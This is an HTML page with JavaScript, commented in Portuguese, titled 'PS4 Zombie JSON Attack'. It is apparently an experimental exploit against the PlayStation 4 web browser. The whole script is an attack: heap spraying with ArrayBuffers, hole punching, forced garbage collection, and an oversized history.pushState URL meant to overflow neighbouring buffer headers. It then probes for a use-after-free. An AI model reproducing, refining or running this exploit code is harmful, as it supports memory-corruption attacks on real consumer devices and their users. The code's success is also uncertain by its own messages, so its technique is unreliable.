<!DOCTYPE html>
<html>
<head>
    <title>PS4 Zombie JSON Attack</title>    
</head>
<body>

    <h1>Ataque Zumbi (Corrupt -> Free)</h1>
    <p>1. Criar JSON | 2. Corromper Header | 3. Forçar GC | 4. Sobrepor</p>

    <button onclick="startZombieAttack()">INICIAR RITUAL ZUMBI</button>
    
    <div id="log">Pronto. Reinicie o console.</div>

    <script>
        const ALIGNED_OFFSET = 709520;
        const OVERFLOW_AMT = 1024 * 64; // 64KB

        // Usaremos ArrayBuffers para tentar capturar a memória zumbi
        // Tamanho de 1MB para alinhar com o Bucket provável
        const TARGET_SIZE = 1024 * 1024; 
        const SPRAY_COUNT = 100;

        var victims = []; // Segura os objetos vivos
        var zombies = []; // Segura os novos objetos que tentam roubar a memória

        function log(msg, type) {
            const el = document.getElementById('log');
            let style = type === 'win' ? 'class="win"' : '';
            el.innerHTML += `<div ${style}>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
            el.scrollTop = el.scrollHeight;
        }

        async function startZombieAttack() {
            log("1. Alocando Vítimas (ArrayBuffers)...");
            
            // FASE 1: Preparar o terreno
            for(let i=0; i<SPRAY_COUNT; i++) {
                let ab = new ArrayBuffer(TARGET_SIZE);
                let view = new Uint8Array(ab);
                view[0] = 0xAA; // Marca original
                victims.push(ab);
            }

            // Criar buracos para a string cair no meio
            for(let i=0; i<SPRAY_COUNT; i+=2) {
                victims[i] = null;
            }
            await forceGC();

            log("2. Disparando Overflow (Corrompendo Vítimas Vivas)...");
            
            // FASE 2: O ATAQUE (Enquanto os objetos ímpares ainda existem)
            setTimeout(() => {
                try {
                    // Alinha em 520 e enche de 0x01
                    // A esperança: O cabeçalho do ArrayBuffer vizinho vira 0x01010101
                    let buffer = "A".repeat(ALIGNED_OFFSET);
                    buffer += "\x01".repeat(OVERFLOW_AMT);
                    
                    // JSON GIGANTE no primeiro parâmetro para confundir o Heap
                    let bigJson = { data: "J".repeat(1024 * 512) };

                    history.pushState(bigJson, "zombie", "/" + buffer);

                    // FASE 3: O RITUAL (Liberação Falsa)
                    log("3. Soltando referências e Forçando GC (Fake Free)...");
                    
                    // Agora soltamos as vítimas que (esperamos) estarem corrompidas
                    victims = null; 

                    // Força o GC a processar os cabeçalhos sujos
                    forceGC().then(() => {
                        log("4. Invocando Zumbis (Realocação)...");
                        checkZombies();
                    });

                } catch (e) {
                    log("Erro: " + e.message);
                }
            }, 500);
        }

        function checkZombies() {
            // FASE 4: CHECAGEM
            // Tentamos alocar novos objetos. Se o GC ficou confuso, 
            // ele pode nos dar memória que já está sendo usada ou misturada.
            
            for(let i=0; i<50; i++) {
                let ab = new ArrayBuffer(TARGET_SIZE);
                let view = new Uint8Array(ab);
                // Marcamos com 0xBB
                view[0] = 0xBB;
                zombies.push(ab);
            }

            let success = false;
            
            // Varre os novos objetos procurando anomalias
            for(let i=0; i<zombies.length; i++) {
                let view = new Uint8Array(zombies[i]);
                
                // Se encontrarmos 0x01 (do overflow) ou 0xAA (das vítimas antigas)
                // significa que a memória foi reutilizada indevidamente (Use-After-Free)
                if (view[0] === 1 || view[0] === 0xAA) {
                     log(`!!! SUCESSO !!! Zumbi ${i} nasceu corrompido! Byte: ${view[0]}`, 'win');
                     alert("USE-AFTER-FREE ACHIEVED!");
                     success = true;
                }
            }

            if (!success) {
                log("Nenhum zumbi detectado. O GC limpou tudo corretamente.");
                log("Tente ajustar o TARGET_SIZE.");
            }
        }

        async function forceGC() {
            try { new ArrayBuffer(100 * 1024 * 1024); } catch(e){}
            return new Promise(r => setTimeout(r, 800));
        }
    </script>
</body>
</html>
